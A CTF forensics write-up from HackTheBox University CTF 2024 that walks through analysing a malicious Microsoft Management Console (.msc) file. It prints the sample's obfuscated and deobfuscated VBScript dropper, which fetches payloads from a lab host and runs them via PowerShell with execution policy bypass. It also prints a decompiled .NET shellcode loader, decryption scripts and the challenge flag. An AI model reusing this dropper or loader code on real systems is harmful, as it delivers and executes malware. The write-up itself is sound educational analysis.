---
title: "Binary Badresources"
description: "Recently, a mysterious syndicate from the far reaches of the Frontier has sent shockwaves through the system by deploying a new, deceptive weapon. Disguised as a harmless gift, it lies dormant until a defender unwittingly activates it, instantly compromising the defensive line and paving the way for invaders to seize the stronghold. To reclaim control over the Frontier Cluster and protect their home from further incursions, brave outlaws and daring defenders are scrambling to decode the mechanics of this weapon and devise a way to disable it—before it’s too late. Every domain found in the challenge should resolve to your docker instance. Do not forget to add the port when visiting the URLs."
pubDate: 2024-12-17
ctf: "HackTheBox University CTF 2024"
category: "forensics"
author: "sealldev"
section: "CTFs"
image: "images/24-htbuni/icon.png"
---



Starting with a `.msc` file and a remote, I look at the file.

`.msc` is for the Microsoft Management Console and it's a 'Snap-in Control File', acting as a kind of 'Module' for the console.

Doing some research on `msc` malware it seems to be [this CVE](https://www.vicarius.io/vsociety/posts/cve-2024-43572-microsoft-management-console-remote-code-execution-vulnerability-detection-script).

Reading the XML in the file, there is some obfuscated JS:
```js
// &#x20;&#x20;&#x20;...
var _0x4ad86c=_0x53e0;(function(_0x4f7c4e,_0xd4182a){var _0x5504c4=_0x53e0,_0x1e159e=_0x4f7c4e();while(!![]){try{var...
```

I take the JS and use a [deobfuscator](https://obf-io.deobfuscate.io/) and we get some XML.

```xml
<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
    <![CDATA[
TpHCM = "":for i = 1 to 3222: TpHCM = TpHCM + chr(Asc(mid("Stxmsr$I|tpmgmxHmq$sfnWlipp0$sfnJWS0$sfnLXXTHmq$wxvYVP50$wxvYVP60$wxvYVP70$wxvWls{jmpiYVPHmq$wxvHs{rpsehTexl50$wxvHs{rpsehTexl60$wxvHs{rpsehTexl70$wxvWls{jmpiTexlHmq$wxvI|igyxefpiTexl0$wxvTs{ivWlippWgvmtxwxvYVP5$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2i|i&wxvYVP6$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2hpp&wxvYVP7$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2i|i2gsrjmk&wxvWls{jmpiYVP$A$&lxxt>33{mrhs{wythexi2lxf3{erxih2thj&wxvHs{rpsehTexl5$A$&G>`Ywivw`Tyfpmg`gwvww2i|i&wxvHs{rpsehTexl6$A$&G>`Ywivw`Tyfpmg`gwvww2hpp&wxvHs{rpsehTexl7$A$&G>`Ywivw`Tyfpmg`gwvww2i|i2gsrjmk&wxvWls{jmpiTexl$A$&G>`Ywivw`Tyfpmg`{erxih2thj&wxvI|igyxefpiTexl$A$&G>`Ywivw`Tyfpmg`gwvww2i|i&Wix$sfnWlipp$A$GviexiSfnigx,&[Wgvmtx2Wlipp&-Wix$sfnJWS$A$GviexiSfnigx,&Wgvmtxmrk2JmpiW}wxiqSfnigx&-Wix$sfnLXXT$A$GviexiSfnigx,&QW\QP62\QPLXXT&-Mj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl5-$Xlir$$$$Hs{rpsehJmpi$wxvYVP50$wxvHs{rpsehTexl5Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl6-$Xlir$$$$Hs{rpsehJmpi$wxvYVP60$wxvHs{rpsehTexl6Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl7-$Xlir$$$$Hs{rpsehJmpi$wxvYVP70$wxvHs{rpsehTexl7Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvWls{jmpiTexl-$Xlir$$$$Hs{rpsehJmpi$wxvWls{jmpiYVP0$wxvWls{jmpiTexlIrh$MjwxvTs{ivWlippWgvmtx$A$c&teveq$,&$*$zfGvPj$*$c&$$$$_wxvmrka(JmpiTexl0&$*$zfGvPj$*$c&$$$$_wxvmrka(Oi}Texl&$*$zfGvPj$*$c&-&$*$zfGvPj$*$c&(oi}$A$_W}wxiq2MS2Jmpia>>ViehEppF}xiw,(Oi}Texl-&$*$zfGvPj$*$c&(jmpiGsrxirx$A$_W}wxiq2MS2Jmpia>>ViehEppF}xiw,(JmpiTexl-&$*$zfGvPj$*$c&(oi}Pirkxl$A$(oi}2Pirkxl&$*$zfGvPj$*$c&jsv$,(m$A$4?$(m$1px$(jmpiGsrxirx2Pirkxl?$(m//-$&$*$zfGvPj$*$c&$$$$(jmpiGsrxirx_(ma$A$(jmpiGsrxirx_(ma$1f|sv$(oi}_(m$)$(oi}Pirkxla&$*$zfGvPj$*$c&&$*$zfGvPj$*$c&_W}wxiq2MS2Jmpia>>[vmxiEppF}xiw,(JmpiTexl0$(jmpiGsrxirx-&$*$zfGvPjHmq$sfnJmpiSr$Ivvsv$Viwyqi$Ri|xWix$sfnJmpi$A$sfnJWS2GviexiXi|xJmpi,&G>`Ywivw`Tyfpmg`xiqt2tw5&0$Xvyi-Mj$Ivv2Ryqfiv$@B$4$Xlir$$$$[Wgvmtx2Igls$&Ivvsv$gviexmrk$Ts{ivWlipp$wgvmtx$jmpi>$&$*$Ivv2Hiwgvmtxmsr$$$$[Wgvmtx2UymxIrh$MjsfnJmpi2[vmxiPmri$wxvTs{ivWlippWgvmtxsfnJmpi2GpswiHmq$evvJmpiTexlwevvJmpiTexlw$A$Evve},wxvHs{rpsehTexl50$wxvHs{rpsehTexl70$wxvWls{jmpiTexl-Hmq$mJsv$m$A$4$Xs$YFsyrh,evvJmpiTexlw-$$$$Hmq$mrxVixyvrGshi$$$$mrxVixyvrGshi$A$sfnWlipp2Vyr,&ts{ivwlipp$1I|igyxmsrTspmg}$F}teww$1Jmpi$G>`Ywivw`Tyfpmg`xiqt2tw5$1JmpiTexl$&$*$Glv,78-$*$evvJmpiTexlw,m-$*$Glv,78-$*$&$1Oi}Texl$&$*$Glv,78-$*$wxvHs{rpsehTexl6$*$Glv,78-0$40$Xvyi-$$$$$$$$Mj$mrxVixyvrGshi$@B$4$Xlir$$$$$$$$[Wgvmtx2Igls$&Ts{ivWlipp$wgvmtx$i|igyxmsr$jempih$jsv$&$*$evvJmpiTexlw,m-$*$&${mxl$i|mx$gshi>$&$*$mrxVixyvrGshi$$$$Irh$MjRi|xsfnWlipp2Vyr$wxvI|igyxefpiTexl0$50$XvyisfnWlipp2Vyr$wxvWls{jmpiTexl0$50$XvyisfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2hpp&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2i|i&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2i|i2gsrjmk&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`xiqt2tw5&Wyf$Hs{rpsehJmpi,yvp0$texl-$$$$Hmq$sfnWxvieq$$$$Wix$sfnWxvieq$A$GviexiSfnigx,&EHSHF2Wxvieq&-$$$$sfnLXXT2Stir$&KIX&0$yvp0$Jepwi$$$$sfnLXXT2Wirh$$$$Mj$sfnLXXT2Wxexyw$A$644$Xlir$$$$$$$$sfnWxvieq2Stir$$$$$$$$sfnWxvieq2X}ti$A$5$$$$$$$$sfnWxvieq2[vmxi$sfnLXXT2ViwtsrwiFsh}$$$$$$$$sfnWxvieq2WeziXsJmpi$texl0$6$$$$$$$$sfnWxvieq2Gpswi$$$$Irh$Mj$$$$Wix$sfnWxvieq$A$RsxlmrkIrh$Wyf",i,1)) - (5) + (1)):Next:Execute TpHCM:
    ]]>
...
```

We can deobfuscate the string in this VBScript with some Python to replicate the functionality:
```python
def deobfuscate(encoded_str):
    decoded = ""
    for i in range(len(encoded_str)):
        decoded += chr(ord(encoded_str[i]) - 5 + 1)
    return decoded

# Replace "..." with the actual encoded string
encoded = "..."
print(deobfuscate(encoded))
```

We get this VBScript:
```vb
Option Explicit
Dim objShell, objFSO, objHTTP
Dim strURL1, strURL2, strURL3, strShowfileURL
Dim strDownloadPath1, strDownloadPath2, strDownloadPath3, strShowfilePath
Dim strExecutablePath, strPowerShellScript
strURL1 = "http://windowsupdate.htb/csrss.exe"
strURL2 = "http://windowsupdate.htb/csrss.dll"
strURL3 = "http://windowsupdate.htb/csrss.exe.config"
strShowfileURL = "http://windowsupdate.htb/wanted.pdf"
strDownloadPath1 = "C:\Users\Public\csrss.exe"
strDownloadPath2 = "C:\Users\Public\csrss.dll"
strDownloadPath3 = "C:\Users\Public\csrss.exe.config"
strShowfilePath = "C:\Users\Public\wanted.pdf"
strExecutablePath = "C:\Users\Public\csrss.exe"

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

If Not objFSO.FileExists(strDownloadPath1) Then
    DownloadFile strURL1, strDownloadPath1
End If
If Not objFSO.FileExists(strDownloadPath2) Then
    DownloadFile strURL2, strDownloadPath2
End If
If Not objFSO.FileExists(strDownloadPath3) Then
    DownloadFile strURL3, strDownloadPath3
End If
If Not objFSO.FileExists(strShowfilePath) Then
    DownloadFile strShowfileURL, strShowfilePath
End If

strPowerShellScript = _
"param (" & vbCrLf & _
"    [string]$FilePath," & vbCrLf & _
"    [string]$KeyPath" & vbCrLf & _
")" & vbCrLf & _
"$key = [System.IO.File]::ReadAllBytes($KeyPath)" & vbCrLf & _
"$fileContent = [System.IO.File]::ReadAllBytes($FilePath)" & vbCrLf & _
"$keyLength = $key.Length" & vbCrLf & _
"for ($i = 0; $i -lt $fileContent.Length; $i++) {" & vbCrLf & _
"    $fileContent[$i] = $fileContent[$i] -bxor $key[$i % $keyLength]" & vbCrLf & _
"}" & vbCrLf & _
"[System.IO.File]::WriteAllBytes($FilePath, $fileContent)" & vbCrLf

Dim objFile
On Error Resume Next
Set objFile = objFSO.CreateTextFile("C:\Users\Public\temp.ps1", True)
If Err.Number <> 0 Then
    WScript.Echo "Error creating PowerShell script file: " & Err.Description
    WScript.Quit
End If
objFile.WriteLine strPowerShellScript
objFile.Close

Dim arrFilePaths
arrFilePaths = Array(strDownloadPath1, strDownloadPath3, strShowfilePath)

Dim i
For i = 0 To UBound(arrFilePaths)
    Dim intReturnCode
    intReturnCode = objShell.Run("powershell -ExecutionPolicy Bypass -File C:\Users\Public\temp.ps1 -FilePath " & Chr(34) & arrFilePaths(i) & Chr(34) & " -KeyPath " & Chr(34) & strDownloadPath2 & Chr(34), 0, True)
    
    If intReturnCode <> 0 Then
        WScript.Echo "PowerShell script execution failed for " & arrFilePaths(i) & " with exit code: " & intReturnCode
    End If
Next

objShell.Run strExecutablePath, 1, True
objShell.Run strShowfilePath, 1, True
objFSO.DeleteFile "C:\Users\Public\csrss.dll"
objFSO.DeleteFile "C:\Users\Public\csrss.exe"
objFSO.DeleteFile "C:\Users\Public\csrss.exe.config"
objFSO.DeleteFile "C:\Users\Public\temp.ps1"

Sub DownloadFile(url, path)
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objHTTP.Open "GET", url, False
    objHTTP.Send
    If objHTTP.Status = 200 Then
        objStream.Open
        objStream.Type = 1
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile path, 2
        objStream.Close
    End If
    Set objStream = Nothing
End Sub
```

Downloading the files from the URLs, we can see the `csrss.dll` encodes all the other files, using the XOR function in `strPowerShellScript`.

I replicate this again in Python:
```python
import os

def xor_decrypt_file(file_path, key_path):
    with open(key_path, 'rb') as key_file:
        key = key_file.read()
    
    with open(file_path, 'rb') as file:
        content = file.read()
    
    decrypted = bytearray()
    for i in range(len(content)):
        decrypted.append(content[i] ^ key[i % len(key)])
    
    with open(file_path+'-dec', 'wb') as file:
        file.write(decrypted)

key_file = "csrss.dll"
files_to_decrypt = [
    "csrss.exe",
    "wanted.pdf",
    "csrss.exe.config"
]

for file_path in files_to_decrypt:
    if os.path.exists(file_path):
        print(f"Decrypting {file_path}")
        xor_decrypt_file(file_path, key_file)
        print(f"Decryption complete for {file_path}")
    else:
        print(f"File not found: {file_path}")

print("Decryption process completed.")
```

The `wanted.pdf` is a red herring, same as the `csrss.exe`, the `csrss.exe.config` has another URL: 
```xml
<configuration>
   <runtime>
      <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
         <dependentAssembly>
            <assemblyIdentity name="dfsvc" publicKeyToken="205fcab1ea048820" culture="neutral" />
            <codeBase version="0.0.0.0" href="http://windowsupdate.htb/5f8f9e33bb5e13848af2622b66b2308c.json"/>
         </dependentAssembly>
      </assemblyBinding>
      <etwEnable enabled="false" />
      <appDomainManagerAssembly value="dfsvc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=205fcab1ea048820" />
      <appDomainManagerType value="dfsvc" />
   </runtime>
</configuration>
```

Downloading `http://windowsupdate.htb/5f8f9e33bb5e13848af2622b66b2308c.json` it's not a JSON, but instead an EXE.
```bash
$ file 5f8f9e33bb5e13848af2622b66b2308c.json 
5f8f9e33bb5e13848af2622b66b2308c.json: PE32+ executable (DLL) (console) x86-64 Mono/.Net assembly, for MS Windows, 2 sections
```

It's compiled with `.NET` so I use Jetbrain's dotPeek to read the EXE.

```cs
// Decompiled with JetBrains decompiler
// Type: dfsvc
// Assembly: dfsvc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=205fcab1ea048820
// MVID: 8E450263-36FD-454A-B5B8-14CA5A72E8D4
// Assembly location: C:\Users\Quickemu\Desktop\configthing.exe

using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

#nullable disable
public sealed class dfsvc : AppDomainManager
{
  public override void InitializeNewDomain(AppDomainSetup appDomaininfo)
  {
    Task.Run((Action) (() => dfsvc.cameldeeplybushes11928.silverquickclam06103())).Wait();
  }

  internal static class avocadoreflectivefloor83964
  {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
      IntPtr lpThreadAttributes,
      uint dwStackSize,
      IntPtr lpStartAddress,
      IntPtr lpParameter,
      uint dwCreationFlags,
      IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [Flags]
    public enum AllocationType
    {
      Commit = 4096, // 0x00001000
      Reserve = 8192, // 0x00002000
      Decommit = 16384, // 0x00004000
      Release = 32768, // 0x00008000
      Reset = 524288, // 0x00080000
      Physical = 4194304, // 0x00400000
      TopDown = 1048576, // 0x00100000
      WriteWatch = 2097152, // 0x00200000
      LargePages = 536870912, // 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
      Execute = 16, // 0x00000010
      ExecuteRead = 32, // 0x00000020
      ExecuteReadWrite = 64, // 0x00000040
      ExecuteWriteCopy = 128, // 0x00000080
      NoAccess = 1,
      ReadOnly = 2,
      ReadWrite = 4,
      WriteCopy = 8,
      GuardModifierflag = 256, // 0x00000100
      NoCacheModifierflag = 512, // 0x00000200
      WriteCombineModifierflag = 1024, // 0x00000400
    }
  }

  internal static class cameldeeplybushes11928
  {
    public static void silverquickclam06103()
    {
      ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
      byte[] source = dfsvc.cameldeeplybushes11928.indigowilddrain95354(new Uri(dfsvc.magentaboorishgirl01630.indigoinnocentbeast26519("ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw=")));
      uint length = (uint) source.Length;
      IntPtr num1 = dfsvc.avocadoreflectivefloor83964.VirtualAlloc(IntPtr.Zero, length, 12288U, 64U);
      Marshal.Copy(source, 0, num1, (int) length);
      int num2 = (int) dfsvc.avocadoreflectivefloor83964.WaitForSingleObject(dfsvc.avocadoreflectivefloor83964.CreateThread(IntPtr.Zero, 0U, num1, IntPtr.Zero, 0U, IntPtr.Zero), uint.MaxValue);
    }

    internal static byte[] indigowilddrain95354(Uri minttemporarybubble05246)
    {
      using (WebClient webClient = new WebClient())
        return webClient.DownloadData(minttemporarybubble05246);
    }
  }

  public static class magentaboorishgirl01630
  {
    private static string creamhollowticket40621 = "tbbliftalildywic";
    private static byte[] fuchsiaaromaticmarket70603 = Encoding.UTF8.GetBytes(dfsvc.magentaboorishgirl01630.creamhollowticket40621);
    private static string mintpumpedowl79724 = "vudzvuokmioomyialpkyydvgqdmdkdxy";
    private static byte[] steelshiveringpark49573 = dfsvc.magentaboorishgirl01630.charcoalderangedcarriage58994(dfsvc.magentaboorishgirl01630.mintpumpedowl79724);
    private static CipherMode cipherMode = CipherMode.CBC;
    private static PaddingMode paddingMode = PaddingMode.Zeros;

    public static string indigoinnocentbeast26519(string claretpurpleneck44589)
    {
      return dfsvc.magentaboorishgirl01630.charcoalsleepyadvertisement91853(Convert.FromBase64String(claretpurpleneck44589)).Replace("\0", string.Empty);
    }

    private static string charcoalsleepyadvertisement91853(byte[] creamgrievingcover13021)
    {
      using (AesManaged aesManaged = new AesManaged())
      {
        aesManaged.Mode = dfsvc.magentaboorishgirl01630.cipherMode;
        aesManaged.Padding = dfsvc.magentaboorishgirl01630.paddingMode;
        aesManaged.Key = dfsvc.magentaboorishgirl01630.steelshiveringpark49573;
        aesManaged.IV = dfsvc.magentaboorishgirl01630.fuchsiaaromaticmarket70603;
        ICryptoTransform decryptor = aesManaged.CreateDecryptor(aesManaged.Key, aesManaged.IV);
        using (MemoryStream memoryStream = new MemoryStream(creamgrievingcover13021))
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
          {
            byte[] numArray = new byte[creamgrievingcover13021.Length];
            int count = cryptoStream.Read(numArray, 0, numArray.Length);
            return Encoding.UTF8.GetString(numArray, 0, count);
          }
        }
      }
    }

    private static byte[] charcoalderangedcarriage58994(string orangewealthyjump31951)
    {
      using (SHA256 shA256 = SHA256.Create())
        return shA256.ComputeHash(Encoding.UTF8.GetBytes(orangewealthyjump31951));
    }
  }
}
```

This seems to be a AES encrypted Base64 encoded URL, we can replicate this in Python (again) to decrypt this string.

```python
import base64
import os
import ctypes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from threading import Thread

class CryptoUtils:
    ENCRYPTION_KEY = "vudzvuokmioomyialpkyydvgqdmdkdxy"
    IV = "tbbliftalildywic".encode('utf-8')

    @staticmethod
    def decrypt(encrypted_data):
        key = SHA256.new(CryptoUtils.ENCRYPTION_KEY.encode('utf-8')).digest()
        cipher = AES.new(key, AES.MODE_CBC, CryptoUtils.IV)
        decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
        return decrypted.decode('utf-8').rstrip('\0')

class MainExecution:
    @staticmethod
    def run():
        encrypted_url = "ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw="
        decrypted_url = CryptoUtils.decrypt(encrypted_url)
        
        print(decrypted_url)

if __name__ == "__main__":
    MainExecution.run()
```

The URL is `http://windowsupdate.htb/ec285935b46229d40b95438707a7efb2282f2f02.xml`, reading the XML the flag is at the bottom in plaintext.

Flag: `HTB{mSc_1s_b31n9_s3r10u5ly_4buSed}`